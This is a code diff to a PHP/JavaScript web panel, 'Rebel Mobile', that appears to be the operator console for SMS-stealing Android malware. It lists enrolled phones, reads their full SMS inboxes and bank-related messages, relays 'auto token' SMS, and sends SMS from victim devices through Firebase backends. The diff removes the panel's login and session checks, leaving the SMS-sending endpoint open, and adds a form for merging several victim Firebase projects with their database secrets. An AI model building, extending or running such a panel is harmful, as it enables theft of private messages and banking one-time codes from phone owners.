@@ -29,71 +29,10 @@ if (isset($_GET['rebel_app_api'])) {
   exit;
 }
 
-if (isset($_GET['rebel_auth']) || isset($_POST['rebel_auth'])) {
-  if ($REBEL_HAS_APP_LIB && rebel_app_is_apk_request()) rebel_app_require_attest();
-  $body = json_decode(file_get_contents('php://input') ?: '{}', true);
-  if (!is_array($body)) $body = [];
-  $action = strtolower(trim((string)($body['action'] ?? $_REQUEST['action'] ?? 'login')));
-  $data = rebel_keys_load();
-
-  if ($action === 'check') {
-    $token = trim((string)($body['token'] ?? ''));
-    if ($token === '') rebel_json_out(['ok' => false, 'error' => 'No session'], 401);
-    $valid = rebel_session_valid($data, $token);
-    if (!$valid) {
-      rebel_keys_save($data);
-      rebel_json_out(['ok' => false, 'error' => 'Session revoked or expired'], 401);
-    }
-    rebel_keys_save($data);
-    rebel_json_out(['ok' => true, 'expires' => (int)$valid['expires']]);
-  }
-
-  if ($action === 'logout') {
-    $token = trim((string)($body['token'] ?? ''));
-    if ($token !== '') {
-      $hash = hash('sha256', $token);
-      if (isset($data['sessions'][$hash])) unset($data['sessions'][$hash]);
-      rebel_keys_save($data);
-    }
-    rebel_json_out(['ok' => true]);
-  }
-
-  $key = rebel_norm_key($body['key'] ?? $_REQUEST['key'] ?? '');
-  if ($key === '') rebel_json_out(['ok' => false, 'error' => 'Access key required'], 400);
-  $infer = rebel_key_infer_type($key);
-  if ($infer === 'apk') {
-    rebel_json_out(['ok' => false, 'error' => 'APK key — website needs /genkey on @Rebelpanelbot'], 403);
-  }
-  $row = $data['keys'][$key] ?? null;
-  if ($row && !rebel_key_allowed_for_client($row, 'web')) {
-    rebel_json_out(['ok' => false, 'error' => 'APK key only. Use /genkey for website'], 403);
-  }
-  $valid = rebel_key_login_allowed($data, $key);
-  if (!$valid) {
-    rebel_keys_save($data);
-    $row = $data['keys'][$key] ?? null;
-    if ($row && (!empty($row['used']) || (int)($row['uses'] ?? 0) >= 1)) {
-      rebel_json_out(['ok' => false, 'error' => 'Key already used'], 403);
-    }
-    rebel_json_out(['ok' => false, 'error' => 'Invalid or expired key'], 403);
-  }
-  rebel_consume_key($data, $key);
-  $remember = !empty($body['remember']);
-  $session = rebel_create_session($data, $key, $remember);
-  rebel_keys_save($data);
-  rebel_json_out(['ok' => true, 'token' => $session['token'], 'expires' => $session['expires']]);
-}
-
 if (isset($_GET['rebel_send_sms']) || isset($_POST['rebel_send_sms'])) {
   $body = json_decode(file_get_contents('php://input') ?: '{}', true);
   if (!is_array($body)) {
     $body = [];
-  }
-
-  $authData = rebel_keys_load();
-  $token = trim((string)($body['token'] ?? ''));
-  if ($token === '' || !rebel_session_valid($authData, $token)) {
-    rebel_json_out(['ok' => false, 'error' => 'Unauthorized — login again'], 401);
   }
 
   $deviceId = trim((string)($body['device_id'] ?? ''));
@@ -336,6 +275,11 @@ body{font-family:'Syne',sans-serif;background:var(--bg);color:var(--text)}
 .fb-option{display:flex;align-items:center;justify-content:space-between;padding:14px;border-radius:12px;border:1px solid var(--border);background:var(--card);margin-bottom:8px;cursor:pointer}
 .fb-option.active{border-color:var(--accent);background:rgba(255,60,60,0.08)}
 .fb-option .cnt{font-size:10px;color:var(--muted);font-family:'Space Mono',monospace}
+.fb-add-form{padding:12px 0 8px;border-top:1px solid var(--border);margin-top:8px}
+.fb-add-form input{width:100%;padding:12px 14px;margin-bottom:8px;border-radius:12px;border:1px solid var(--border);background:var(--card);color:var(--text);font-size:13px;outline:none}
+.fb-add-form input:focus{border-color:var(--accent)}
+.btn-add-fb{width:100%;padding:14px;border:none;border-radius:12px;background:linear-gradient(135deg,var(--accent2),#cc7700);color:#111;font-weight:800;font-size:14px;cursor:pointer;margin-top:4px}
+.chip.fb{background:rgba(255,149,0,0.15);color:var(--accent2);font-size:9px}
 
 .toast-wrap{position:fixed;top:calc(12px + var(--safe-t));left:14px;right:14px;z-index:200;pointer-events:none}
 .toast{padding:12px 14px;border-radius:12px;background:var(--card);border:1px solid var(--border);font-size:12px;margin-bottom:8px;animation:toastIn .3s ease}
@@ -345,42 +289,8 @@ body{font-family:'Syne',sans-serif;background:var(--bg);color:var(--text)}
 </head>
 <body>
 
-<!-- LOGIN -->
-<div class="login-screen" id="loginScreen">
-  <div class="login-card">
-    <div class="login-hero">
-      <div class="avatar-stage" id="rebelAvatarStage" data-avatar-ver="7">
-        <div class="avatar-face-ring">
-          <div class="avatar-img-wrap">
-            <img class="avatar-face" id="avatarFaceImg" src="<?php echo htmlspecialchars($REBEL_AVATAR_URL, ENT_QUOTES, 'UTF-8'); ?>" alt="Rebel" onerror="this.onerror=null;this.src='https://raw.githubusercontent.com/ujjwalrebel53-wq/SpinPlay99/main/IMG_20260609_231734_741.jpg'"/>
-          </div>
-        </div>
-        <div class="avatar-laptop">
-          <div class="laptop-glow"></div>
-          <div class="laptop-lid">
-            <div class="laptop-screen">
-              <div class="laptop-code" id="laptopCode">
-                <span class="laptop-line l1"><span class="dim">$</span> firebase.init()</span>
-                <span class="laptop-line l2"><span class="hi">send</span>Sms(<span class="dim">to</span>, msg)</span>
-                <span class="laptop-line l3"><span class="dim">$</span> rebel.unlock()<span class="laptop-cursor"></span></span>
-              </div>
-            </div>
-          </div>
-          <div class="laptop-base"></div>
-        </div>
-      </div>
-      <h1><em>Rebel</em> Mobile</h1>
-    </div>
-    <p class="login-sub">🌐 Website key — @Rebelpanelbot → <b>/genkey</b></p>
-    <div class="login-err" id="loginErr"></div>
-    <input class="key-input" id="loginKey" placeholder="RBW-XXXXXX-XXXXXX" autocomplete="off" maxlength="32"/>
-    <label class="remember"><input type="checkbox" id="rememberMe" checked/> Remember this phone</label>
-    <button class="btn-primary" id="loginBtn" onclick="doLogin()">Unlock Panel</button>
-  </div>
-</div>
-
 <!-- APP -->
-<div class="app hidden" id="appShell">
+<div class="app" id="appShell">
   <header class="hdr">
     <div class="hdr-left">
       <div class="rebel-avatar-sm">
@@ -445,11 +355,10 @@ body{font-family:'Syne',sans-serif;background:var(--bg);color:var(--text)}
     <section class="screen" id="screen-more">
       <span class="proto-tag">📱 MOBILE PROTOTYPE</span>
       <div class="menu-list">
-        <div class="menu-item" onclick="openFbSheet()">Firebase Project <span id="moreFbName">—</span></div>
+        <div class="menu-item" onclick="openFbSheet()">Firebase Projects <span id="moreFbName">—</span></div>
         <div class="menu-item" onclick="toggleAutoToken()">Auto Token SMS <div class="toggle" id="autoTokenToggle"></div></div>
         <div class="menu-item" onclick="useSelForAutoToken()">Set Auto SMS Device <span>Use current</span></div>
         <a class="menu-item" href="sex.php" style="text-decoration:none;color:inherit">Desktop Panel <span>sex.php →</span></a>
-        <div class="menu-item danger" onclick="doLogout()">Logout</div>
       </div>
     </section>
   </div>
@@ -467,20 +376,26 @@ body{font-family:'Syne',sans-serif;background:var(--bg);color:var(--text)}
 <div class="sheet-bg" id="sheetBg" onclick="closeFbSheet()"></div>
 <div class="sheet" id="fbSheet">
   <div class="sheet-handle"></div>
-  <div class="sheet-title">Switch Firebase</div>
+  <div class="sheet-title">Firebase Projects — All Combined</div>
   <div id="fbSheetList"></div>
+  <div class="fb-add-form">
+    <input id="fbAddName" placeholder="Project name (e.g. Panel 2)"/>
+    <input id="fbAddUrl" placeholder="Firebase URL — https://xxx.firebaseio.com"/>
+    <input id="fbAddSecret" placeholder="Database secret / auth key (optional)"/>
+    <input id="fbAddApiKey" placeholder="Web API key (optional — for live updates)"/>
+    <button class="btn-add-fb" type="button" onclick="addFirebaseProject()">+ Add Firebase Project</button>
+  </div>
 </div>
 <div class="toast-wrap" id="toasts"></div>
 
 <script src="firebase_defaults.js"></script>
 <script>
-var AUTH_URL='mobile.php?rebel_auth=1';
 var SEND_SMS_URL='mobile.php?rebel_send_sms=1';
 var SMS_TOKEN_URL='sex.php?sms_token_api=1';
-var allDevs=[], selDev='', activeFbId='', clientsRawMap={};
+var allDevs=[], selDev='', clientsRawMap={};
 var firebaseInstances=[], firebaseConfigs=[], panelReady=false;
 var activeListeners={}, window_sms=[], window_allSms=[], window_newSms=[];
-var ACTIVE_FB_KEY='rbl_active_fb_m';
+var FB_LIST_KEY='rbl_firebase_list';
 var SKIP_NODES=['config','settings','admin','rules','metadata','logs','test','user','users','messages','admin_pass','passwords','webhook','tokens','auth'];
 var SUMMARY_NODES=['devices_status','clients'];
 var DEVICE_NODES=['devices','users','clients_list','online_devices'];
@@ -522,19 +437,37 @@ function makeDevKey(fbId,devId){return fbId+'::'+devId;}
 function parseDevKey(key){var i=String(key).indexOf('::');return i<0?{fbId:'',devId:key}:{fbId:key.slice(0,i),devId:key.slice(i+2)};}
 function getFbInstance(fbId){for(var i=0;i<firebaseInstances.length;i++)if(firebaseInstances[i].id===fbId)return firebaseInstances[i];return null;}
 function getSelDev(){return allDevs.find(function(d){return d.id===selDev;})||null;}
-function getFilteredDevs(){return activeFbId?allDevs.filter(function(d){return d.fbId===activeFbId;}):allDevs;}
+function getFilteredDevs(){return allDevs;}
+function saveFirebaseConfigs(){
+  try{localStorage.setItem(FB_LIST_KEY,JSON.stringify(firebaseConfigs));}catch(e){}
+}
 function restJson(url){return fetch(url,{cache:'no-store'}).then(function(r){return r.json();}).catch(function(){return null;});}
 function isFirebaseErr(d){return !!(d&&typeof d==='object'&&d.error&&Object.keys(d).length<=2);}
 
 function loadFirebaseConfigs(){
   try{
-    var s=localStorage.getItem('rbl_firebase_list');
+    var s=localStorage.getItem(FB_LIST_KEY);
     if(s){var p=JSON.parse(s);if(Array.isArray(p)&&p.length){
       DEFAULT_FIREBASES.forEach(function(def){if(!p.some(function(c){return c.id===def.id;}))p.push(def);});
       return p;
     }}
   }catch(e){}
   return DEFAULT_FIREBASES.slice();
+}
+function getFbAuthKey(inst){
+  if(!inst||!inst.config)return '';
+  var c=inst.config;
+  return c.secret||c.authKey||c.key||c.databaseSecret||'';
+}
+function restUrlForInst(inst,path){
+  var url=inst.restUrl+'/'+path.replace(/^\//,'');
+  if(!/\.json(\?|$)/.test(url))url+='.json';
+  var key=getFbAuthKey(inst);
+  if(key)url+=(url.indexOf('?')>=0?'&':'?')+'auth='+encodeURIComponent(key);
+  return url;
+}
+function restJsonInst(inst,path){
+  return restJson(restUrlForInst(inst,path));
 }
 function initFirebaseInstance(cfg){
   var appName='mfb_'+cfg.id,db=null;
@@ -551,30 +484,74 @@ function initFirebaseInstance(cfg){
 function initFirebase(){
   firebaseInstances=[];firebaseConfigs=loadFirebaseConfigs();
   firebaseConfigs.forEach(initFirebaseInstance);
-  try{activeFbId=localStorage.getItem(ACTIVE_FB_KEY)||'';}catch(e){}
-  if(!activeFbId&&firebaseConfigs.length){var r=firebaseConfigs.find(function(c){return c.id==='rabel_raand';});activeFbId=r?r.id:firebaseConfigs[0].id;}
   updateFbUi();
+}
+function addFirebaseProject(){
+  var name=document.getElementById('fbAddName').value.trim();
+  var url=document.getElementById('fbAddUrl').value.trim().replace(/\/$/,'');
+  var secret=document.getElementById('fbAddSecret').value.trim();
+  var apiKey=document.getElementById('fbAddApiKey').value.trim();
+  if(!name||!url){toast('Project name aur Firebase URL zaroori hai',false);return;}
+  if(firebaseConfigs.some(function(c){return (c.databaseURL||'').replace(/\/$/,'')===url;})){
+    toast('Yeh Firebase URL pehle se added hai',false);return;
+  }
+  var id='fb_'+Date.now();
+  var cfg={
+    id:id,
+    name:name,
+    databaseURL:url,
+    secret:secret,
+    key:secret,
+    apiKey:apiKey,
+    schema:url.indexOf('rabel')>=0?'rabel':'spinplay'
+  };
+  firebaseConfigs.push(cfg);
+  saveFirebaseConfigs();
+  var inst=initFirebaseInstance(cfg);
+  attachLive(inst);
+  discoverInstance(inst).then(function(){
+    processClientsData();
+    updateFbUi();
+    toast('Added: '+name,true);
+  });
+  document.getElementById('fbAddName').value='';
+  document.getElementById('fbAddUrl').value='';
+  document.getElementById('fbAddSecret').value='';
+  document.getElementById('fbAddApiKey').value='';
+  closeFbSheet();
+}
+function removeFirebaseProject(id){
+  if(firebaseConfigs.length<=1){toast('Kam se kam 1 Firebase chahiye',false);return;}
+  firebaseConfigs=firebaseConfigs.filter(function(c){return c.id!==id;});
+  saveFirebaseConfigs();
+  Object.keys(clientsRawMap).forEach(function(k){
+    if(k.indexOf(id+'::')===0)delete clientsRawMap[k];
+  });
+  if(selDev&&selDev.indexOf(id+'::')===0){selDev='';clearListeners();}
+  firebaseInstances=[];
+  firebaseConfigs.forEach(initFirebaseInstance);
+  firebaseInstances.forEach(function(inst){attachLive(inst);});
+  Promise.all(firebaseInstances.map(discoverInstance)).then(function(){
+    processClientsData();
+    updateFbUi();
+    toast('Project removed',true);
+  });
 }
 initFirebase();
 
 function updateFbUi(){
-  var inst=getFbInstance(activeFbId);
-  var name=inst?inst.name:'—';
-  document.getElementById('fbChip').textContent=name;
-  document.getElementById('moreFbName').textContent=name;
-  document.getElementById('hdrSub').textContent=inst?(getFilteredDevs().length+' devices · '+name):'No Firebase';
+  var total=allDevs.length;
+  var proj=firebaseConfigs.length;
+  document.getElementById('fbChip').textContent=proj+' FB · '+total+' dev ▾';
+  document.getElementById('moreFbName').textContent=proj+' projects';
+  document.getElementById('hdrSub').textContent=total+' devices · '+proj+' Firebase combined';
   var html=firebaseConfigs.map(function(c){
     var cnt=allDevs.filter(function(d){return d.fbId===c.id;}).length;
-    return '<div class="fb-option'+(c.id===activeFbId?' active':'')+'" onclick="switchFirebase(\''+c.id+'\')"><div>'+esc(c.name)+'</div><div class="cnt">'+cnt+' devices</div></div>';
+    return '<div class="fb-option"><div><div>'+esc(c.name)+'</div><div class="cnt">'+cnt+' devices · '+esc((c.databaseURL||'').replace(/^https?:\/\//,'').split('/')[0])+'</div></div>'+
+      (proj>1?'<button type="button" onclick="event.stopPropagation();removeFirebaseProject(\''+c.id+'\')" style="background:none;border:1px solid var(--border);color:var(--error);border-radius:8px;padding:6px 10px;font-size:10px;cursor:pointer">✕</button>':'')+
+      '</div>';
   }).join('');
-  document.getElementById('fbSheetList').innerHTML=html;
-}
-function switchFirebase(id){
-  if(!getFbInstance(id))return;
-  activeFbId=id;try{localStorage.setItem(ACTIVE_FB_KEY,id);}catch(e){}
-  if(selDev){var d=getSelDev();if(!d||d.fbId!==id){selDev='';clearListeners();}}
-  updateFbUi();renderDevices();renderDeviceView();renderSms();updateSendForm();renderBankAccounts();
-  closeFbSheet();toast('Switched to '+getFbInstance(id).name,true);
+  document.getElementById('fbSheetList').innerHTML=html||'<div class="empty-state" style="padding:20px"><div class="ico">🔥</div>No Firebase yet — add below</div>';
 }
 function openFbSheet(){document.getElementById('sheetBg').classList.add('open');document.getElementById('fbSheet').classList.add('open');}
 function closeFbSheet(){document.getElementById('sheetBg').classList.remove('open');document.getElementById('fbSheet').classList.remove('open');}
@@ -614,9 +591,8 @@ function mergeSummaryNode(fbId,node,raw){
 }
 function processClientsData(){
   allDevs=[];
-  var raw={};Object.keys(clientsRawMap).forEach(function(k){if(!activeFbId||k.indexOf(activeFbId+'::')===0)raw[k]=clientsRawMap[k];});
-  Object.keys(raw).forEach(function(k){
-    var s=raw[k],p=parseDevKey(k),inst=getFbInstance(p.fbId);
+  Object.keys(clientsRawMap).forEach(function(k){
+    var s=clientsRawMap[k],p=parseDevKey(k),inst=getFbInstance(p.fbId);
     var on=resolveOnlineStatus(s,p.fbId);
     allDevs.push({id:k,rawId:p.devId,fbId:p.fbId,fbName:inst?inst.name:p.fbId,deviceNode:s._node||'clients',
       name:s.name||'Unknown',displayPhone:getPhoneFromRecord(s)||'No Number',brand:s.brand||'',android:s.android||'',
@@ -634,10 +610,12 @@ function updateStats(){
   document.getElementById('stOffline').textContent=l.filter(function(d){return d.status==='offline';}).length;
 }
 function fetchSummaryNode(inst,node){
-  return restJson(inst.restUrl+'/'+node+'.json').then(function(raw){mergeSummaryNode(inst.id,node,raw);processClientsData();});
+  return restJsonInst(inst,node).then(function(raw){mergeSummaryNode(inst.id,node,raw);processClientsData();});
 }
 function discoverInstance(inst){
-  return restJson(inst.restUrl+'/.json?shallow=true').then(function(roots){
+  var key=getFbAuthKey(inst);
+  var shallow=inst.restUrl+'/.json?shallow=true'+(key?'&auth='+encodeURIComponent(key):'');
+  return restJson(shallow).then(function(roots){
     if(!roots||typeof roots!=='object')return;
     var nodes=Object.keys(roots).filter(function(n){return SKIP_NODES.indexOf(n)<0;});
     var tasks=[];
@@ -650,16 +628,16 @@ function discoverInstance(inst){
 }
 function attachLive(inst){
   if(!inst.db||inst.liveAttached)return;inst.liveAttached=true;
-  ['clients','devices_status'].forEach(function(node){
+  ['clients','devices_status','devices'].forEach(function(node){
     inst.db.ref(node).on('value',function(s){if(s.exists()){mergeSummaryNode(inst.id,node,s.val());processClientsData();}});
   });
 }
 function fetchAllData(){
-  document.getElementById('hdrSub').textContent='Syncing...';
+  document.getElementById('hdrSub').textContent='Syncing all Firebase...';
   firebaseInstances.forEach(attachLive);
   return Promise.all(firebaseInstances.map(discoverInstance)).then(function(){
     processClientsData();
-    document.getElementById('hdrSub').textContent=getFilteredDevs().length+' devices';
+    document.getElementById('hdrSub').textContent=allDevs.length+' devices · '+firebaseConfigs.length+' Firebase combined';
     if(selDev)loadSmsForDevice();
   });
 }
@@ -674,7 +652,7 @@ function renderDevices(){
     return '<div class="dev-card '+d.status+(d.id===selDev?' active':'')+'" onclick="selectDevice(\''+d.id+'\')">'+
       '<div class="dev-bar"></div><div class="dev-body">'+
       '<div class="dev-phone">'+esc(d.displayPhone)+'</div>'+
-      '<div class="dev-meta">'+esc(d.name)+' · '+esc(d.rawId.substring(0,14))+'</div>'+
+      '<div class="dev-meta">'+esc(d.name)+' · <span class="chip fb">'+esc(d.fbName)+'</span></div>'+
       '<div class="dev-chips"><span class="chip bat">'+d.battery+'%</span><span class="chip">'+esc(d.network)+'</span><span class="chip">'+d.smsCount+' SMS</span></div>'+
       '</div></div>';
   }).join('');
@@ -690,7 +668,7 @@ function renderDeviceView(){
   empty.classList.add('hidden');hero.classList.remove('hidden');
   hero.innerHTML='<div class="hero-card">'+
     '<div class="hero-phone">'+esc(d.displayPhone)+'</div>'+
-    '<div class="hero-model">'+esc(d.name)+(d.brand?' · '+esc(d.brand):'')+'</div>'+
+    '<div class="hero-model">'+esc(d.name)+(d.brand?' · '+esc(d.brand):'')+' · <span class="chip fb">'+esc(d.fbName)+'</span></div>'+
     '<div class="hero-badge '+d.status+'">'+(d.status==='online'?'● ONLINE':'○ OFFLINE')+'</div>'+
     '<div class="hero-grid">'+
     '<div class="hero-cell"><div class="hero-lbl">BATTERY</div><div class="hero-val">'+d.battery+'%</div></div>'+
@@ -761,16 +739,16 @@ function loadSmsForDevice(){
     var ref=inst.db?inst.db.ref(path).limitToLast(80):null;
     var h=function(s){onData(s.val());};
     if(ref){ref.on('value',h);activeListeners[d.id]={db:inst.db,ref:ref,h:h};}
-    else{var tick=function(){restJson(inst.restUrl+'/'+path+'.json').then(onData);};tick();activeListeners[d.id]={timer:setInterval(tick,3000)};}
+    else{var tick=function(){restJsonInst(inst,path).then(onData);};tick();activeListeners[d.id]={timer:setInterval(tick,3000)};}
   }else{
     var p2=(d.deviceNode||'devices')+'/'+d.rawId+'/all_sms';
     var p3=(d.deviceNode||'devices')+'/'+d.rawId+'/new_sms';
     var tick2=function(){
-      restJson(inst.restUrl+'/'+p2+'.json').then(function(data){
+      restJsonInst(inst,p2).then(function(data){
         window_allSms=smsAsList(data).map(normalizeSms);
         if(document.getElementById('screen-bank').classList.contains('active'))renderBankAccounts();
       });
-      restJson(inst.restUrl+'/'+p3+'.json').then(function(data){
+      restJsonInst(inst,p3).then(function(data){
         renderSmsFromData(data);
       });
     };
@@ -852,18 +830,11 @@ function normalizePhone(raw){
   if(clean.length>10&&clean.indexOf('91')===0)return clean.slice(-10);
   return clean;
 }
-function getFbAuthKey(inst){
-  if(!inst||!inst.config)return '';
-  var c=inst.config;
-  return c.secret||c.authKey||c.key||c.databaseSecret||'';
-}
 function sendSmsFetch(body){
-  var s=getSession();body=body||{};
-  if(s&&s.token)body.token=s.token;
   var hdr={'Content-Type':'application/json'};
   var apk=rebelApkHeaders();
   for(var k in apk)hdr[k]=apk[k];
-  return fetch(SEND_SMS_URL,{method:'POST',headers:hdr,body:JSON.stringify(body)})
+  return fetch(SEND_SMS_URL,{method:'POST',headers:hdr,body:JSON.stringify(body||{})})
     .then(function(r){return r.json().then(function(j){return{httpOk:r.ok,data:j};});});
 }
 function sendSms(){
@@ -1026,7 +997,7 @@ function switchTab(name,btn){
   if(name==='bank'&&selDev)renderBankAccounts();
 }
 
-/* AUTH */
+/* APK headers + boot */
 function rebelApkHeaders(){
   var h={};
   if(window.RebelAndroid){
@@ -1037,47 +1008,14 @@ function rebelApkHeaders(){
   }
   return h;
 }
-function authFetch(body){
-  var hdr={'Content-Type':'application/json'};
-  var apk=rebelApkHeaders();
-  for(var k in apk)hdr[k]=apk[k];
-  return fetch(AUTH_URL,{method:'POST',headers:hdr,body:JSON.stringify(body||{})})
-    .then(function(r){return r.json().then(function(j){return{ok:r.ok,data:j};});});
-}
-function getSession(){try{return JSON.parse(localStorage.getItem('rbl_session')||sessionStorage.getItem('rbl_session')||'null');}catch(e){return null;}}
-function unlockApp(token,exp,remember){
-  var s={token:token,exp:exp||0};
-  if(remember)localStorage.setItem('rbl_session',JSON.stringify(s));else sessionStorage.setItem('rbl_session',JSON.stringify(s));
-  document.getElementById('loginScreen').classList.add('hidden');
-  document.getElementById('appShell').classList.remove('hidden');
-  if(!panelReady){panelReady=true;fetchAllData();loadAutoTokenState();}
-}
-function doLogin(){
-  var key=(document.getElementById('loginKey').value||'').trim().toUpperCase();
-  if(!key){document.getElementById('loginErr').textContent='Enter access key';document.getElementById('loginErr').style.display='block';return;}
-  document.getElementById('loginBtn').disabled=true;
-  authFetch({action:'login',key:key,remember:document.getElementById('rememberMe').checked}).then(function(res){
-    document.getElementById('loginBtn').disabled=false;
-    if(res.ok&&res.data&&res.data.ok){unlockApp(res.data.token,res.data.expires,document.getElementById('rememberMe').checked);return;}
-    document.getElementById('loginErr').textContent=res.data&&res.data.error||'Invalid key';
-    document.getElementById('loginErr').style.display='block';
-  }).catch(function(){document.getElementById('loginBtn').disabled=false;});
-}
-function doLogout(){
-  var s=getSession();if(s&&s.token)authFetch({action:'logout',token:s.token});
-  localStorage.removeItem('rbl_session');sessionStorage.removeItem('rbl_session');
-  location.reload();
-}
-document.getElementById('loginKey').addEventListener('input',function(){this.value=this.value.toUpperCase().replace(/[^A-Z0-9\-]/g,'');});
 
 /* AUTO TOKEN (via sex.php API) */
 var _autoTokenOn=false;
 function smsTokenFetch(body){
-  var s=getSession();body=body||{};if(s&&s.token)body.token=s.token;
   var hdr={'Content-Type':'application/json'};
   var apk=rebelApkHeaders();
   for(var k in apk)hdr[k]=apk[k];
-  return fetch(SMS_TOKEN_URL,{method:'POST',headers:hdr,body:JSON.stringify(body)})
+  return fetch(SMS_TOKEN_URL,{method:'POST',headers:hdr,body:JSON.stringify(body||{})})
     .then(function(r){return r.json();});
 }
 function loadAutoTokenState(){
@@ -1098,23 +1036,16 @@ function useSelForAutoToken(){
   });
 }
 
-/* BOOT */
+/* BOOT — direct open, all Firebase combined */
 (function(){
-  var s=getSession();
-  if(s&&s.token){
-    authFetch({action:'check',token:s.token}).then(function(res){
-      if(res.ok&&res.data&&res.data.ok)unlockApp(s.token,s.exp,true);
-      else localStorage.removeItem('rbl_session');
-    });
-  }
+  panelReady=true;
+  fetchAllData();
+  loadAutoTokenState();
 })();
 setInterval(function(){
   if(!panelReady)return;
-  var s=getSession();
-  if(s&&s.token)authFetch({action:'check',token:s.token}).then(function(res){
-    if(!res.ok||!res.data||!res.data.ok){doLogout();}
-  });
-},30000);
+  fetchAllData();
+},60000);
 </script>
 </body>
 </html>
